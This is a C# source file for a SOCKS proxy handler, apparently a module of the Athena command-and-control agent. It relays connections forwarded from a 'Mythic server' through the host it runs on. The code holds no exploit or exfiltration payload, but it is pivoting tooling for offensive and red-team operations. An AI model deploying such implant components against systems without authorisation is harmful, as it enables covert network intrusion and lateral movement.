using Athena.Models.Athena.Commands;
using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace Athena.Commands
{
    //Try using this library for next rewrite
    //https://github.com/godsharp/GodSharp.Socket/blob/master/samples/GodSharp.Socket.TcpClientSample/Program.cs
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
        public bool running { get; set; }

        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            if (!this.running)
            {
                return true;
            }

            this.running = false;

            if (this.ct is not null)
            {
                this.ct.Cancel();
            }

            return true;
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(AthenaSocksConnection conn)
        {
            return this.connections.TryAdd(conn.server_id, conn);
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {
            if (!this.connections.ContainsKey(sm.server_id)) //Check if this is a new connection
            {
                if (!sm.exit) 
                { 
                    await HandleNewConnection(sm); //Add new connection
                }
                return;
            }

            //We already know about this packet, so lets continue

            if (!String.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
            {
                if (this.connections[sm.server_id].client.IsConnected) //Check if our connection is alive
                {
                    Debug.WriteLine($"[{DateTime.Now}] Sending {Misc.Base64DecodeToByteArray(sm.data).Length} bytes to session: {sm.server_id}");
                    this.connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
                }
            }

            if (sm.exit) //Finally, let's see if exit was set to true
            {
                if (this.connections[sm.server_id].client.IsConnected) //Are we still connected and need to initiate a disconnect?
                {
                    Debug.WriteLine($"[{DateTime.Now}] Disconnecting session: {sm.server_id}");
                    this.connections[sm.server_id].client.DisconnectAsync(); //We are, so let's issue the disconnect
                }

                Debug.WriteLine($"[{DateTime.Now}] Removing session: {sm.server_id}");
                this.connections.TryRemove(sm.server_id, out _); //Finally, remove the session from our tracker
            }

        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data)) //We got an empty packet even though we should be recieving connect data.
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet 
                if (!co.Parse()) //Check if parsing succeeded or not
                {
                    ReturnMessageFailure(co.server_id); //Packet parse failed.
                    return;
                }

                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect
                await AddConnection(sc); //Add our connection to the Dictionary;
                
                sc.client.Connect(); //Connect to the endpoint

                sc.onSocksEvent.WaitOne(); //Wait for something to happen.

                SocksMessage smOut;
                if (sc.client.IsConnected)
                {
                    smOut = new SocksMessage(
                        sc.server_id,
                        new ConnectResponse
                        {
                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                            bndport = new byte[] { 0x00, 0x00 },
                            addrtype = co.addressType,
                            status = ConnectResponseStatus.Success,
                        }.ToByte(),
                        false
                        );
                    await SocksResponseHandler.AddSocksMessageAsync(smOut);
                }
                else
                {
                    ReturnMessageFailure(sc.server_id);
                }
            } 
            catch (Exception e)
            {
                Debug.WriteLine("Message ID " + sm.server_id + Environment.NewLine + e.ToString());
                Debug.WriteLine(sm.data);
                ReturnMessageFailure(sm.server_id);
            }
        }

        public async void ReturnMessageFailure(int id)
        {
            await SocksResponseHandler.AddSocksMessageAsync(
                new SocksMessage(
                    id, 
                    new ConnectResponse{
                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                            bndport = new byte[] { 0x00, 0x00 },
                            status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }

        public void GetSocksMessages()
        {
            if (this.connections.Count < 1)
            {
                return;
            }

            List<SocksMessage> messages = new List<SocksMessage>();

            foreach (var conn in this.connections)
            {
                SocksMessage sm = conn.Value.GetMessage();
                if (sm is not null)
                {
                    messages.Add(sm);

                    if (sm.exit)
                    {
                        this.connections.TryRemove(sm.server_id, out _);
                    }

                    SocksResponseHandler.AddSocksMessageAsync(sm);
                }
            }
        }
    }
}